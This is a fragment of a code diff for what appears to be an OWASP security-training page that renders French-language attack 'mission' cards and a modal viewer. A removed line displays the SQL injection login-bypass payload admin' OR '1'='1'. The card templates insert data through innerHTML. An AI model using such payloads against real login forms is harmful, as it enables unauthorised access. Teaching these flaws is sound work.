-            else if(mission.id === 1) overlaySpan.innerHTML = "🔓 Auth Bypass: admin' OR '1'='1'";
-            else if(mission.id === 3) overlaySpan.innerHTML = "⚠️ Erreur → chemin absolu divulgué";
-            else overlaySpan.innerHTML = `🎭 ${mission.title.split(' ')[0]} exploit`;
-            imgDiv.appendChild(overlaySpan);
-            
-            const contentDiv = document.createElement('div');
-            contentDiv.className = 'card-content';
-            contentDiv.innerHTML = `
-                <div class="mission-number">OWASP ${mission.cwe.split(' - ')[0]}</div>
-                <div class="mission-title">${mission.title}</div>
-                <div class="cve-badge">${mission.cwe}</div>
-                <div class="short-desc">${mission.shortDesc}</div>
-                <div class="click-info">🔍 Cliquez pour visualiser l'attaque (capture + étapes détaillées)</div>
-            `;
-            card.appendChild(imgDiv);
-            card.appendChild(contentDiv);
-            card.addEventListener('click', () => openModal(mission));
-            gridContainer.appendChild(card);
-        });
+    function closeModal() {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
     }
-    
-    renderCards();
-    closeModalBtn.addEventListener('click', closeModal);
-    modalOverlay.addEventListener('click', (e) => { if (e.target === modalOverlay) closeModal(); });
-    document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && modalOverlay.classList.contains('active')) closeModal(); });
+
+    // Render cards
+    missions.forEach(m => {
+        const card = document.createElement('div');
+        card.className = 'mission-card';
+
+        card.innerHTML = `
+            <div class="card-img" style="background: ${m.bgStyle}">
+                <div class="img-overlay">${m.visual}</div>
+            </div>
+            <div class="card-content">
+                <div class="mission-number">OWASP ${m.cwe.split(':')[0]}</div>
+                <div class="mission-title">${m.title}</div>
+                <div class="cve-badge">${m.cwe}</div>
+                <div class="short-desc">${m.shortDesc}</div>
+                <div class="click-info">
+                    <i class="fas fa-magnifying-glass"></i> 
+                    Cliquez pour voir l’attaque détaillée
+                </div>
+            </div>
+        `;
+
+        card.addEventListener('click', () => openModal(m));
+        grid.appendChild(card);
+    });
+
+    closeBtn.addEventListener('click', closeModal);
+    modal.addEventListener('click', e => {
+        if (e.target === modal) closeModal();
+    });
+    document.addEventListener('keydown', e => {
+        if (e.key === "Escape" && modal.classList.contains('active')) closeModal();
+    });
 </script>
 </body>
 </html>
